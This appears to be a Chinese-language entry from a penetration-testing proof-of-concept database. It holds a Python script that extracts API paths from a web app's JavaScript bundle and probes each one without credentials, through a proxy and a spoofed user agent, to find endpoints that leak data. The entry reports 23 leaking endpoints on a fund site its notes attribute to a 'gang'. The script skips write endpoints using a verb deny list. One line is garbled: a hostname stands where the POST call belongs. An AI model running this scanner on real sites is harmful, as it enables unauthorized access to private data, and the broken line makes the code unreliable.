# SPA bundle 端点半自动提取 + 只读白名单批量未授权探测（含写语义端点硬跳过）

- **code**: spa-bundle-端点半自动提取-只读白名单批量未授权探测-含写语义端点硬跳过
- **kind**: script
- **category**: unauthorized
- **component**: [范围外来源·方法通用] 前端 bundle 逆向 + 只读白名单批量未授权探测
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 example.com 实测：141 个只读端点 / 158 次请求 / 163.9 秒（0.96 req/s），23 个端点未授权返回真实业务数据（其中 9 个为新增），资金类接口稳定返回「您的账号未登录」作为对照；写语义 46 个端点零请求。
- **path**: pocs/spa-bundle-端点半自动提取-只读白名单批量未授权探测-含写语义端点硬跳过/poc.py
- **tags**: 未授权,SPA逆向,批量探测,只读白名单,Java,Spring,范围外来源,方法本身通用
- **created_at**: 2026-09-28T09:52:03.702Z
- **found_by**: exploit

## 描述

从 SPA 打包 JS 里提取全部业务路径，用「只读前缀白名单 + 写语义黑名单」二分，再逐个无鉴权请求并回落 POST {}，按响应信封分类鉴权状态。适用于本团伙同套 Java 后端（响应信封统一为 {"status":1,"msg":"SUCCESS"} / {"status":2,"msg":"您的账号未登录，请登录后再操作！"} / {"status":999,"msg":"Request Uri Not Found!"}）。**关键纪律：写语义端点（add/insert/update/delete/remove/modify/edit/apply/recharge/withdraw/receive/give/send/read/register/disabled/callback/upload...）必须完全跳过，一个请求都不发**，避免误触提现/充值/改密。

## 用法

```
1) 取当前构建：`curl -s -x http://127.0.0.1:7892 --compressed "https://<host>/" | grep -oE 'static/js/[a-zA-Z0-9._]+js'`（旧 hash 会 404，必须从 example.com 取）
2) 提取路径：`python tgt2905_ep.py` → runs/tgt2905_endpoints.json（正则多根 + 去 CSS-module 噪声）
3) 批量只读探测：`python tgt2905_probe.py` → runs/tgt2905_probe.json；读语义端点名单 runs/tgt2905_skipped.json（写语义，零请求）
4) 逐个确认命中体：`python tgt2905_hits.py <min_len>`
速度默认 0.55s/请求（≤2 req/s）；命中「WAF / 操作频繁 / 锁定」立即停。
```

## 正文

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""Batch unauthorised probe of tgt2905 fund-site endpoints. STRICTLY READ-ONLY.

Policy:
  * last path segment starting with find/query/get/select/list/my/agent -> READ  (GET probed)
  * last path segment matching a WRITE verb -> SKIPPED entirely (never requested)
  * anything else -> GET probed; POST {} retried only when classified "read-like"
Rate <=2 req/s. Output runs/tgt2905_probe.json
"""
import json
import os
import re
import time

import requests

HOST = "https://example.com"
PROXY = {"http": "http://127.0.0.1:7892", "https": "http://127.0.0.1:7892"}
OUTDIR = r"C:\rt\dgha\runs"
EPS = os.path.join(OUTDIR, "tgt2905_endpoints.json")
OUT = os.path.join(OUTDIR, "tgt2905_probe.json")
RATE = 0.55
UA = ("Mozilla/5.0 (Linux; Android 12; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/203.0.113.36 Mobile Safari/537.36")

READ_PREFIX = re.compile(r"^(find|query|get|select|list|my|agentquery|check|is|valid|logout|login)", re.I)
WRITE_WORDS = re.compile(
    r"(add|insert|update|delete|remove|modify|edit|apply|recharge|withdraw|receive|obtain|give|"
    r"send|readall|readmessage|disabled|callback|save|create|register|bind|change|storage|"
    r"inspection|cancel|reset|upload|exec|import|export|confirm|success|docash|"
    r"pay\b|paymethod/change|setdefault|logout|signup|getpocket|receivebonus|receivereward|"
    r"receivehandsel|receivereward|receivememberhandsel|signobtain|registration|registers|givepromotion)",
    re.I)
NOISE = re.compile(r"(__|^/content-|^/user-agent|^/system-(alert|ui)$|^/payVoucher$|^/bankFour|^/bankThree|"
                   r"^/banktwo|^/bank_card|^/bankDetail|^/payee$|^/payment$|^/userInfo$|^/userName$|"
                   r"^/userInterface$|^/systemConfig$|^/member/bankCard//)", re.I)
API = re.compile(r"^/(agent|member|capital|discount|pay|im_sys|sys|user)/")


def load():
    d = json.load(open(EPS, encoding="utf-8"))
    read, skip = [], []
    for p in d["endpoints"]:
        if NOISE.search(p) or not API.match(p):
            continue
        last = p.rstrip("/").split("/")[-1]
        if READ_PREFIX.match(last):
            read.append(p)
        elif WRITE_WORDS.search(last):
            skip.append(p)
        else:
            read.append(p)
    return sorted(set(read)), sorted(set(skip))


def classify(status, body):
    if status in (404, 405, 500, 502, 403, 400):
        return "none"
    try:
        j = json.loads(body)
    except Exception:
        return "other"
    if isinstance(j, dict):
        if j.get("status") == 1:
            return "SUCCESS"
        if j.get("status") == 2:
            return "auth"
        msg = str(j.get("msg", ""))
        if "未登录" in msg:
            return "auth"
        if "参数" in msg or "Missing" in msg or "Required" in msg or "请求方式" in msg:
            return "needparam"
    return "other"


def main():
    read, skip = load()
    print("READ endpoints:", len(read), " SKIPPED(write):", len(skip))
    json.dump({"skipped_write": skip}, open(os.path.join(OUTDIR, "tgt2905_skipped.json"), "w",
                                            encoding="utf-8"), ensure_ascii=False, indent=1)
    sess = requests.Session()
    sess.proxies = PROXY
    sess.headers.update({"User-Agent": UA, "Accept": "*/*"})
    results, n, t0 = [], 0, time.time()
    for ep in read:
        rec = {"ep": ep}
        try:
            r = sess.get(HOST + ep, timeout=20)
            body = r.text[:6000]
            st, cls = r.status_code, classify(r.status_code, body)
        except Exception as e:
            st, body, cls = 0, "ERR:%s" % e, "err"
        n += 1
        time.sleep(RATE)
        rec["GET"] = {"status": st, "cls": cls, "len": len(body), "body": body}
        print("[%-9s] %-3s %-6s %s" % (cls, st, rec["GET"]["len"], ep), flush=True)
        if cls in ("needparam", "none", "other"):
            try:
                r = target25.example.com(HOST + ep, data=b"{}", timeout=20,
                              headers={"Content-Type": "application/json"})
                body2 = r.text[:6000]
                st2, cls2 = r.status_code, classify(r.status_code, body2)
            except Exception as e:
                st2, body2, cls2 = 0, "ERR:%s" % e, "err"
            n += 1
            time.sleep(RATE)
            rec["POST"] = {"status": st2, "cls": cls2, "len": len(body2), "body": body2}
            print("[%-9s] %-3s %-6s %s  (POST)" % (cls2, st2, rec["POST"]["len"], ep), flush=True)
        results.append(rec)
    el = time.time() - t0
    meta = {"host": HOST, "requests": n, "seconds": round(el, 1), "rate": round(n / max(el, .001), 2),
            "read_eps": len(read), "skipped_write": len(skip)}
    json.dump({"meta": meta, "results": results}, open(OUT, "w", encoding="utf-8"),
              ensure_ascii=False, indent=1)
    hits = [r for r in results if any(r.get(m, {}).get("cls") == "SUCCESS" for m in ("GET", "POST"))]
    print("\n=== meta:", json.dumps(meta, ensure_ascii=False))
    print("=== SUCCESS hits:", len(hits))
    for r in hits:
        m = "GET" if r.get("GET", {}).get("cls") == "SUCCESS" else "POST"
        print("%-4s %-10s %s" % (m, r[m]["len"], r["ep"]))


if __name__ == "__main__":
    main()

```
